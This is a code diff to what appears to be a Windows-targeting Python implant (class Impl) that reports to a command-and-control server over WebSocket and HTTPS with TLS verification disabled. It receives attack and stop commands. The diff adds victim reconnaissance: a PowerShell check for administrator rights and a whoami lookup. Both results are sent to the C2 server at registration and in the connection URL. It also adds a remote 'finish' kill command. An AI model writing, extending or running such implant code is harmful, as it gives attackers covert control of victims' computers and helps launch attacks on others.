@@ -82,7 +82,7 @@ class Impl:
             ssl_context.verify_mode = ssl.CERT_NONE
             
             async with connect(
-                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
+                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
                 ping_interval=20,
                 ping_timeout=10,
                 close_timeout=10,
@@ -120,6 +120,8 @@ class Impl:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
+            elif 'finish' in data:
+                await self._exit(ws)
         
         except asyncio.TimeoutError:
             
@@ -528,6 +530,11 @@ class Impl:
                         attack['loop']
                     )
 
+    
+    async def _exit(self, ws):
+        
+        await ws.close()
+        sys.exit(0)
 
     
     async def register(self) -> bool:
@@ -538,9 +545,12 @@ class Impl:
             'public_ip': self._get_public_ip(),
             'local_ip': self._get_local_ips(),
             'operating_system': self._get_operating_system(),
-            'impl_id': self.impl_id
+            'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
+            'root': self._get_root(),
+            'user': self._get_user()
         }
 
+        
         
         session = requests.Session()
         session.mount('https://', SSLAdapter())
@@ -552,7 +562,7 @@ class Impl:
                 await asyncio.sleep(1)
             try:
                 req = session.post(
-                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",
+                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),
                     data=model,
                     timeout=10,
                     verify=False 
@@ -600,7 +610,16 @@ class Impl:
         sysop, err, _ = self._execute_shell_command('(Get-CimInstance Win32_OperatingSystem).Caption')
         return sysop.strip() if sysop else "undefined"
     
+    def _get_root(self) -> bool:
+        isAdmin, err, _ = self._execute_shell_command('([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')
+        if isAdmin.strip() == "True":
+            return True
+        else:
+            return False
 
+    def _get_user(self) -> str:
+        user, err, _ = self._execute_shell_command('whoami')
+        return user.strip() if user else "undefined"
 
 
 if __name__ == "__main__":
